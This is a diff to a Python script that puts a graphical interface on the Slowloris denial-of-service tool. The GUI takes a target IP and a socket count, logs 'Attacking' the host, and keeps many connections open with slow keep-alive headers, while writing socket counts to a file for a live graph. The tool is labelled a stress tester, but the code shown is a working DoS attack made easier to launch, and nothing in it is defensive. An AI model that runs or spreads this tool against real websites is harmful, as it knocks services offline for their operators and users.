@@ -2,16 +2,49 @@ import argparse
 import logging
 import random
 import socket
-import sys
 import time
+import os
 import PySimpleGUI as sg
+from PySimpleGUI.PySimpleGUI import WIN_CLOSED
+from os import system
+
+
+
+
+#-------------
+system('cls')
+#===========================================================================================
+#================================ verificar arquivo de texto ===============================
+while True:
+    try:
+        arquivo_G = open('pontos_G', 'r')
+        arquivo_G.close()
+        break
+    except Exception as erro:
+        try:
+            arquivo_G = open('pontos_G', 'w')
+            arquivo_G.close()
+            break
+        except Exception as erro1:
+            print(f'erro: {erro}')          
+#==========================================================================================
+diretorio = os.path.dirname(os.path.realpath(__file__))
+os.startfile(diretorio+'\Grafico_S.py')
+#==========================================================================================
+#================== adicionar informação ao arquivo de texto para o grafico ===============
+def esc_ar_txt(infor): # 
+    arquivo_txt = open('pontos_G', 'w')
+    arquivo_txt.write(infor)
+    arquivo_G.close()
+#==========================================================================================
+
 
 class Tela:
     def __init__(self):
         layout = [
             [sg.Text('ip:',font=("Helvetica", 13))], [sg.Input('',key='host1')],
             [sg.Text('===========================',font=('Helvetical', 15), text_color='black')],
-            [sg.Text('quandidade de tomadas:', font=('Helvetica',13))], [sg.Input('',key='sockets1')],
+            [sg.Text('quantidade de tomadas:', font=('Helvetica',13))], [sg.Input('150',key='sockets1')],
             [sg.Text('===========================',font=('Helvetical', 15), text_color='black')],
             [sg.Output(size=(70, 10))],
             [sg.Button('start')]
@@ -20,12 +53,13 @@ class Tela:
     def Iniciar(self):
         while True:
             self.event, self.values = self.janela.Read()
+            if self.event == sg.WIN_CLOSED:
+                exit()
+
             host1 = self.values['host1']
             sockets1 = self.values['sockets1']
 
 
-#host1 = input('ip: ')
-#sockets1 = input('qtdd de tomadas: ')
             parser = argparse.ArgumentParser(
                 description="Slowloris, low bandwidth stress test tool for websites"
             )
@@ -94,7 +128,8 @@ class Tela:
             #    print("Host required!")
             #    parser.print_help()
             #    sys.exit(1)
-
+            
+#=============================================================================================
             if args.useproxy:
                 # Tries to import to external "socks" library
                 # and monkey patches socket.socket to connect over
@@ -109,6 +144,8 @@ class Tela:
                     logging.info("Using SOCKS5 proxy for connecting...")
                 except ImportError:
                     logging.error("Socks Proxy Library Not Available!")
+#==============================================================================================
+
 
             if args.verbose:
                 logging.basicConfig(
@@ -190,9 +227,12 @@ class Tela:
 
 
             def main():
+                if self.event == sg.WIN_CLOSED:
+                    exit()
                 ip = host1
                 socket_count = int(sockets1)
                 logging.info("Attacking %s with %s sockets.", ip, socket_count)
+                
 
                 logging.info("Creating sockets...")
                 for _ in range(socket_count):
@@ -207,9 +247,16 @@ class Tela:
                 while True:
                     try:
                         logging.info(
-                            "Sending keep-alive headers... Socket count: %s",
+                            "Sending keep-alive headers...0000 Socket count: %s",
                             len(list_of_sockets),
                         )
+                        tomadDG = len(list_of_sockets)
+                        #=================================
+                        
+                        esc_ar_txt(str(tomadDG))#           coletando dados para o grafico
+                        #=================================
+                        
+                    
                         for s in list(list_of_sockets):
                             try:
                                 s.send_header("X-a", random.randint(1, 5000))
